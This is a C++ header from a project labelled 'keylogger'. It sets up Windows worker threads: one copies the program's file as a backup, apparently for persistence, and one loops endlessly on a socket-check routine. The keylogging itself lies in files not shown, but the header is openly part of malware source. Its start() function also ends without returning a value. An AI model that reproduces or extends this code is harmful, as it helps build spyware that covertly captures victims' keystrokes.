//
//  prepare.h
//  keylogger
//
//  Created by Arekor on 5/16/2560 BE.
//
//

#ifndef prepare_h
#define prepare_h

#include "IO.h"
#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <sockstatus.h>


#define BUF_SIZE 1024
namespace pre {
    DWORD WINAPI ThreadCheckFile(LPVOID lpParam);
    DWORD WINAPI ThreadCopy(LPVOID lpParam);

    typedef struct checkdata {
        bool value;

    } checkdata, *Pcheckdata;

    DWORD WINAPI ThreadCopy(LPVOID lpParam) {
        HANDLE hStdout;
        Pcheckdata pDataArray;

        // Make sure there is a console to receive output results.

        hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hStdout == INVALID_HANDLE_VALUE)
            return 1;

        // Cast the parameter to the correct data type.
        // The pointer is known to be valid because
        // it was checked for NULL before the thread was created.

        pDataArray = (Pcheckdata) lpParam;

        // Print the parameter values using thread-safe functions.
        if (!(pDataArray->value)) {
            //do copy 1
            if (IO::copy_File()) {
                pDataArray->value = true;
                return 0;
            } else {
                //cannot backup i will die
                return 1;
            }
        }

        return 1;
    }

    DWORD WINAPI ThreadCheckFile(LPVOID lpParam) {
        HANDLE hStdout;
        Pcheckdata pDataArray;

        // Make sure there is a console to receive output results.

        hStdout = GetStdHandle(STD_OUTPUT_HANDLE);
        if (hStdout == INVALID_HANDLE_VALUE)
            return 1;

        // Cast the parameter to the correct data type.
        // The pointer is known to be valid because
        // it was checked for NULL before the thread was created.

        pDataArray = (Pcheckdata) lpParam;

        // Print the parameter values using thread-safe functions.
        //Tu do check file
        while (true) {
            ss::creckSoc();
        }
    }



    bool start(int MAX_Procress) {
        Pcheckdata pDataArray[MAX_Procress];
        DWORD dwThreadIdArray[MAX_Procress];
        HANDLE hThreadArray[MAX_Procress];

        // Create MAX_Procress worker threads.

        for (int i = 0; i < MAX_Procress; i++) {
            // Allocate memory for thread data.

            pDataArray[i] = (Pcheckdata) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                                   sizeof(checkdata));

            if (pDataArray[i] == NULL) {
                // If the array allocation fails, the system is out of memory
                // so there is no point in trying to print an error message.
                // Just terminate execution.
                return false;
            }

            // Generate unique data for each thread to work with.

            pDataArray[i]->value = false;


            // Create the thread to begin execution on its own.
            if (i == 0) {
                hThreadArray[i] = CreateThread(
                        NULL,                   // default security attributes
                        0,                      // use default stack size
                        ThreadCheckFile,       // thread function name
                        pDataArray[i],          // argument to thread function
                        0,                      // use default creation flags
                        &dwThreadIdArray[i]);   // returns the thread identifier

            } else {
                hThreadArray[i] = CreateThread(
                        NULL,                   // default security attributes
                        0,                      // use default stack size
                        ThreadCopy,       // thread function name
                        pDataArray[i],          // argument to thread function
                        0,                      // use default creation flags
                        &dwThreadIdArray[i]);   // returns the thread identifier

            }


            // Check the return value for success.
            // If CreateThread fails, terminate execution.
            // This will automatically clean up threads and memory.

            if (hThreadArray[i] == NULL) {

                return false;
            }
        }
    }
}
#endif /* prepare_h */
